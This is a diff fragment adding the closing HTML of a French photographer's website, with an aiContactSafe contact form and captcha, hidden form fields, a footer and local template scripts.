+						<div id="div_captcha_info">Veuillez recopier le code&nbsp;:</div>
+						<div id="div_captcha_img"><div id="div_captcha_img_2" style="width:150px;height:50px;">...</div></div>
+						<div id="div_captcha_new">
+							<a href="javascript:void(0);" onclick="changeCaptcha(2,1);"
+								id="change-image">Recharger le code...</a>
+						</div>
+						<div style="margin-top:5px;" id="div_captcha_code"><input type="text" name="captcha-code" id="captcha-code" /></div>
+					</div>
+								<br clear="all" />
+			<div id="aiContactSafeBtns"><div id="aiContactSafeButtons_left" style="clear:both; display:block; width:100%; text-align:left;"><div id="aiContactSafeSend" style="float:left;"><div id="aiContactSafeSend_loading_2" style="float:left; margin:2px;">&nbsp;</div><input type="submit" id="aiContactSafeSendButton" value="Envoyer" style="float:left; margin:2px;" /></div></div></div>
+			<br clear="all" />
+		<input type="hidden" id="option" name="option" value="com_aicontactsafe" /><input type="hidden" id="sTask" name="sTask" value="message" /><input type="hidden" id="task" name="task" value="display" /><input type="hidden" id="send_mail" name="send_mail" value="1" /><input type="hidden" id="pf" name="pf" value="2" /><input type="hidden" id="return_to" name="return_to" value="http://frederic-sonnino.com/index.php?option=com_aicontactsafe&#38;view=message&#38;layout=message&#38;pf=2&#38;Itemid=6" /><input type="hidden" id="current_url" name="current_url" value="http://frederic-sonnino.com/index.php?option=com_aicontactsafe&#38;view=message&#38;layout=message&#38;pf=2&#38;Itemid=6" /><input type="hidden" id="Itemid" name="Itemid" value="0" /><input type="hidden" id="lang" name="lang" value="" /><input type="hidden" id="back_button" name="back_button" value="0" /><input type="hidden" id="boxchecked" name="boxchecked" value="0" /><input type="hidden" id="use_ajax" name="use_ajax" value="1" /><input type="hidden" id="r_id" name="r_id" value="1098182216" /><input type="hidden" name="dfe3e98e2de0e6811aa39261d0318e3b" value="1" /></form>						</td>
+				</tr>
+			</table>
+	</div>
+</div>
+							
+												
+						</div>
+
+					</div>
+					
+									
+			</div>
+		
+		</div>
+		
+		<div id="s5_bottom_tr">
+		
+			<div id="s5_bottom_rm"></div>
+		
+		</div>
+		
+		<div style="clear:both"></div>
+		
+		<div id="s5_bl_shadow" style="width:832px"></div>
+		
+		<div id="s5_br_shadow"></div>
+		
+	</div>
+	
+	<div style="clear:both"></div>
+	
+	 
+			
+			<div id="s5_footer" style="width:948px">
+			
+				<div id="s5_footer_text">
+				<span class="footerc">
+Copyright &copy; 2018.  Photographies de Frederic Sonnino.
+
+</span>
+				</div>
+				
+				<div id="s5_bottom" style="width:448px">
+					
+				</div>
+			
+			</div>
+			
+			<div style="clear:both"></div>
+			
+		</div>
+	
+	<div style="height:10px"></div>
+	
+	<script type="text/javascript" language="javascript" src="/templates/aluma_photography/js/s5_effects.js"></script>
+
+		<script type="text/javascript" language="javascript" src="/templates/aluma_photography/js/tooltips.js"></script>
+		
+		<script type="text/javascript">
+
+	var s5_bg = "url(/templates/aluma_photography/images/s5_default_bg.jpg)";
+	s5_load_bg();
+
+	</script>
+	
+				<script type="text/javascript" src="/templates/aluma_photography/js/s5_fading_no_moo_menu.js"></script>
+			
+</body>
+
+</html>
